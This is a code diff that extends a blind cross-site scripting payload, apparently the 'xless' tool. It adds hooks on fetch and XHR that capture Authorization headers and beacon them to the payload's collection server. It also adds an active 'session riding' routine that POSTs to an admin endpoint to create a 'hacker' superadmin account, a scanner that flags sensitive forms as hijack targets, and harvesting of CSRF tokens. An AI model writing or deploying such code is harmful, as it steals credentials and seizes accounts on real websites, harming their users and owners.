@@ -32,6 +32,99 @@
     }
   } catch (e) { }
 
+  // [TECHNIQUE 5] Hook Networking to Capture Auth Headers
+  // We hook fetch and XHR immediately to catch any subsequent requests
+  (function hookNetworking() {
+    if (window.xlessHooked) return;
+    window.xlessHooked = true;
+    window.xlessCapturedHeaders = {};
+
+    // Hook Fetch
+    const originalFetch = window.fetch;
+    window.fetch = function () {
+      var args = arguments;
+      if (args[1] && args[1].headers) {
+        // CheckHeaders
+        try {
+          var headers = args[1].headers;
+          var headerObj = {};
+          if (headers instanceof Headers) {
+            headers.forEach((v, k) => headerObj[k] = v);
+          } else {
+            headerObj = headers;
+          }
+
+          // Look for Authorization
+          for (var k in headerObj) {
+            if (k.toLowerCase() === 'authorization') {
+              window.xlessCapturedHeaders[args[0]] = headerObj[k];
+              // Optional: Exfiltrate immediately
+              new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("Captured Auth: " + headerObj[k]);
+            }
+          }
+        } catch (e) { }
+      }
+      return originalFetch.apply(this, args);
+    };
+
+    // Hook XHR
+    const originalOpen = XMLHttpRequest.prototype.open;
+    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+
+    XMLHttpRequest.prototype.open = function (method, url) {
+      this._xlessUrl = url;
+      return originalOpen.apply(this, arguments);
+    }
+
+    XMLHttpRequest.prototype.setRequestHeader = function (header, value) {
+      if (header.toLowerCase() === 'authorization') {
+        window.xlessCapturedHeaders[this._xlessUrl || "Unknown_XHR"] = value;
+      }
+      return originalSetRequestHeader.apply(this, arguments);
+    }
+  })();
+
+  // [TECHNIQUE 3] Session Riding (Dual Strategy: Simple + Smart)
+  function attemptSessionRiding() {
+    // Strategy A: "Simple & Working" - Hardcoded Target (for demo/specific app)
+    var targetEndpoint = "/api/admin/create_user";
+
+    // Attempt the blind POST
+    try {
+      fetch(targetEndpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ action: 'create_admin', username: 'hacker', role: 'superadmin' })
+      }).then(function (r) {
+        // Log success to our C2 if possible
+        if (r.ok) new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("Session Riding Success: " + targetEndpoint);
+      });
+    } catch (e) { }
+
+    // Strategy B: "Application Aware" - Form Auto-Discovery
+    // Look for sensitive forms and log them (or adventurous: try to hijack)
+    try {
+      var forms = document.getElementsByTagName('form');
+      for (var i = 0; i < forms.length; i++) {
+        var f = forms[i];
+        var action = f.action;
+        var txt = f.innerText.toLowerCase();
+        // Heuristic: does it look sensitive?
+        if (txt.includes('password') || txt.includes('email') || txt.includes('admin') || action.includes('update') || action.includes('change')) {
+          new Image().src = scriptSrc + "/message?text=" + encodeURIComponent("POTENTIAL HIJACK TARGET FOUND: " + action);
+
+          // Optional: Auto-submit if it's a simple inputs
+          // f.submit(); // Dangerous/Loud
+        }
+      }
+    } catch (e) { }
+  }
+  attemptSessionRiding(); // Activated
+  // attemptSessionRiding(); // Uncomment to activate
+
+
   function captureScreenshots() {
     if (typeof html2canvas === "undefined") return Promise.resolve([]);
 
@@ -236,6 +329,27 @@
 
         return tokens.length > 0 ? tokens.join("\n") : "None found";
       },
+      "CSRF Tokens": function () {
+        var tokens = [];
+        // 1. Search meta tags
+        var metas = document.getElementsByTagName('meta');
+        for (var i = 0; i < metas.length; i++) {
+          if (metas[i].name && /csrf|xsrf|token/i.test(metas[i].name)) {
+            tokens.push("Meta: " + metas[i].name + " = " + metas[i].content);
+          }
+        }
+        // 2. Search inputs
+        var inputs = document.getElementsByTagName('input');
+        for (var i = 0; i < inputs.length; i++) {
+          if (inputs[i].name && /csrf|xsrf|token/i.test(inputs[i].name)) {
+            tokens.push("Input: " + inputs[i].name + " = " + inputs[i].value);
+          }
+        }
+        return tokens.length > 0 ? tokens.join("\n") : "None found";
+      },
+      "Captured Auth Headers": function () {
+        return window.xlessCapturedHeaders ? JSON.stringify(window.xlessCapturedHeaders, null, 2) : "None captured yet";
+      },
       DOM: function () {
         return document.documentElement.outerHTML || "";
       },
@@ -367,8 +481,8 @@
           return send(data);
         }
         // If still too large, truncate DOM as last resort
-        if (data["DOM"] && data["DOM"].length > 1000000) {
-          data["DOM"] = data["DOM"].substring(0, 1000000) + "... [Truncated due to size constraints]";
+        if (data["DOM"] && data["DOM"].length > 1500000) {
+          data["DOM"] = data["DOM"].substring(0, 1500000) + "... [Truncated due to size constraints]";
           return send(data);
         }
       }
